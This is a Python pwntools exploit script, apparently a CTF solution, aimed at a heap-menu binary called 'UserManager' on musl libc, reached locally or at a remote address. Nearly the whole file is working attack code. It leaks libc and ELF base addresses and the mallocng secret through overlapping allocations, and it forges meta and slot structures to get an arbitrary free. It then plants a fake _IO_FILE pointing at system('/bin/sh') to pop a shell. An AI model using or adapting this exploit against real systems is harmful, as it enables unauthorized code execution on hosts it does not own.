# encoding=utf-8
from pwn import *

context(log_level='debug', arch='amd64', os='linux')

# functions for quick script
s = lambda data: p.send(data)
sa = lambda delim, data: p.sendafter(delim, data)
sl = lambda data: p.sendline(data)
sla = lambda delim, data: p.sendlineafter(delim, data)
r = lambda numb=4096, timeout=2: p.recv(numb, timeout=timeout)
ru = lambda delims, drop=True: p.recvuntil(delims, drop)  # by default, drop is set to false
irt = lambda: p.interactive()
# misc functions
uu32 = lambda data: u32(data.ljust(4, b'\x00'))
uu64 = lambda data: u64(data.ljust(8, b'\x00'))  # to get 8 byte addr
leak = lambda name, addr: log.success('{} = {:#x}'.format(name, addr))


# gdb debug
def z(a=''):
    if local:
        gdb.attach(p, a)
        if a == '':
            raw_input()


# basic config
local = 1

elf_path = "UserManager"
libc = ELF('./libc.so')

elf = ELF(elf_path)


# libc    = elf.libc

def start():
    global p
    if local:
        p = process(elf_path)
    else:
        p = remote('123.56.45.155', 23014)


def add(id, size, content):
    sla(': ', '1')
    sla('Id: ', str(id))
    sla('UserName length: ', str(size))
    sla('UserName: ', content)


def show(id):
    sla(': ', '2')
    sla('Id: ', str(id))


def dele(id):
    sla(': ', '3')
    sla('Id: ', str(id))


def clear():
    sla(': ', '4')


class META_struct:
    BIT_FIELD_BLEN = {
        'last_idx': 5,
        'freeable': 1,
        'sizeclass': 6,
        'maplen': 52,
    }

    FIELD_NAME = (
        'prev',
        'next',
        'mem',
        'avail_mask',
        'freed_mask',
        'last_idx',
        'freeable',
        'sizeclass',
        'maplen'
    )

    def __init__(self):
        self.__data = {}
        for k in self.FIELD_NAME:
            self.__data[k] = 0

    def __setattr__(self, attr, vaule):
        if attr in self.FIELD_NAME:
            self.__data[attr] = vaule
        else:
            super().__setattr__(attr, vaule)

    def __getattr__(self, attr):
        if attr in self.FIELD_NAME:
            return self.__data[attr]
        else:
            return super().__getattr__(attr)

    def __bytes__(self):
        payload = b''

        for k in ('prev', 'next', 'mem'):
            payload += p64(self.__data[k])
        for k in ('avail_mask', 'freed_mask'):
            payload += p32(self.__data[k])
        bv = 0
        bpos = 0
        for k in ('last_idx', 'freeable', 'sizeclass', 'maplen'):
            blen = self.BIT_FIELD_BLEN[k]
            bv |= (self.__data[k] & ((1 << blen) - 1)) << bpos
            bpos += blen
        payload += p64(bv)

        return payload


def exp():
    for i in range(7 - 2):
        add(i, 0x98, str(i) * 8)
    clear()

    add(4, 0x38, 'aaaaaaa')

    add(4, 0x98, 'bbbbbbb')

    add(3, 0x98, 'oooooooo')  # 用user占位4的name

    show(4)
    r(8)
    libc_base = uu64(r(6)) - 0xb7a60
    leak('libc', libc_base)
    r(2 + 8 * 2)
    elf_base = uu64(r(6)) - 0x5d80
    leak('elf_base', elf_base)
    z('watch * 0x555555559da0')
    # pause()
    dele(3)

    secret_offset = 0xb4ac0
    add(3, 0x38, p64(4) + p64(libc_base + secret_offset) + p64(0x38) + p64(0x2) + p64(0xdeadbeef))  # 用name反过来占位3的user
    # pause()
    show(4)

    secret = uu64(r(8))
    leak('secret', secret)

    system = libc_base + libc.sym['system']

    # fake start
    # page_addr = libc_base - 0x7000 # noaslr
    page_addr = libc_base - 0x3000  # aslr
    fake_file_addr = libc_base + (0xb7f50)  # addr of fake file struct
    ofl_head_addr = libc_base + (0xb6e48)

    #  写一个伪造的指针到name，用于任意地址free
    dele(3)
    add(3, 0x98, 'oooooooo')  # 用user占位4的name,重新做一遍，防止后续parent时出现问题。
    dele(3)
    add(3, 0x38, p64(4) + p64(page_addr + 0x40) + p64(0x38) + p64(0x2) + p64(0xdeadbeef))

    # 伪造各种结构体到mmap内存上
    fm = META_struct()
    fm.prev = ofl_head_addr - 8
    fm.next = fake_file_addr
    fm.mem = page_addr + 0x30
    fm.freeable = 1
    fm.maplen = 1

    fake_slot = flat({
        0: secret,
        0x8: bytes(fm),
        0x30: page_addr + 0x8,
        0x38: 0,
    }, filler=b'\x00')

    payload = 0xfe0 * b'\x00' + fake_slot
    add(9, 0x1300, payload)

    # trigger dequeue
    dele(4)

    # fake _IO_FILE
    fake_file = flat({
        0: b"/bin/sh\x00",
        0x28: 0xdeadbeef,
        0x38: 0xcafebabe,
        0x48: system
    }, filler=b'\x00')
    add(20, 0x78, fake_file)  # 看一下mheapinfo，然后打一个可分配的
    pause()
    sl('6')


start()
exp()
irt()
